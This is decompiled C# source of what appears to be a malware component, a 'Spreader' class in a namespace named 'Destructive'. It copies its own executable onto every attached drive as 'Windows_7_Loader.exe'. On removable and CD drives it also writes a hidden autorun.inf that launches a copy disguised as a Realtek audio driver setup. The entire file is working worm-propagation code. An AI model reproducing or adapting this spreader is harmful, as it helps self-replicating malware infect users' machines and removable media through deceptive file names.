using System;
using System.IO;
using System.Reflection;
using Quarknova.Properties;
using Quarknova.Utilities;

namespace Quarknova.Destructive
{
	// Token: 0x0200000B RID: 11
	internal class Spreader
	{
		// Token: 0x06000096 RID: 150 RVA: 0x00005810 File Offset: 0x00003A10
		public static void Execute()
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			int i = 0;
			while (i < drives.Length)
			{
				DriveInfo driveInfo = drives[i];
				if (driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.CDRom)
				{
					try
					{
						File.WriteAllText(driveInfo.Name + "autorun.inf", string.Concat(new string[]
						{
							"[autorun]",
							Environment.NewLine,
							"open=setup.exe",
							Environment.NewLine,
							"icon=setup.ico",
							Environment.NewLine,
							"action=Run Realtek HD audio drivers setup",
							Environment.NewLine,
							"label=Realtek HD audio drivers"
						}));
						File.WriteAllBytes(driveInfo.Name + "setup.ico", Functions.IconToBytes(Resources.realtek));
						File.Copy(Assembly.GetEntryAssembly().Location, driveInfo.Name + "setup.exe", true);
						File.SetAttributes(driveInfo.Name + "setup.exe", FileAttributes.Normal);
						File.Copy(Assembly.GetEntryAssembly().Location, driveInfo.Name + "Windows_7_Loader.exe", true);
						File.SetAttributes(driveInfo.Name + "Windows_7_Loader.exe", FileAttributes.Normal);
						Functions.HideFile("autorun.inf");
						Functions.HideFile("setup.ico");
						Functions.HideFile("setup.exe");
						goto IL_186;
					}
					catch
					{
						goto IL_186;
					}
					goto IL_146;
				}
				goto IL_146;
				IL_186:
				i++;
				continue;
				IL_146:
				try
				{
					File.Copy(Assembly.GetEntryAssembly().Location, driveInfo.Name + "Windows_7_Loader.exe", true);
					File.SetAttributes(driveInfo.Name + "Windows_7_Loader.exe", FileAttributes.Normal);
				}
				catch
				{
				}
				goto IL_186;
			}
		}
	}
}
